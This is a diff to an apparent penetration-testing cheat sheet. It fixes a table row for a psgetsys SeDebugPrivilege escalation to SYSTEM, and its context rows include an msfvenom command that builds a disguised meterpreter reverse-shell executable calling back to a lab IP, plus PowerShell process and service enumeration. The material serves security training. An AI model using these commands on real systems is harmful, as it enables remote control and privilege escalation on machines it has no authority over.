@@ -2978,7 +2978,7 @@ apt update hooking (PreInvoke)
 | `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe` | Generating a malicious binary |
 | `get-process -Id 3324` | Enumerating a process ID with PowerShell |
 | `get-service \| ? {$_.DisplayName -like 'Druva*'}` | Enumerate a running service by name with PowerShell |
-| `.\psgetsys.ps1; [MyProcess]::CreateProcessFromParent((6) | | 
+| `.\psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"") ` | [Script](https://github.com/decoder-it/psgetsystem) RCE using SeDebugPrivilege as System  | 
 
 ### Credential Theft
 
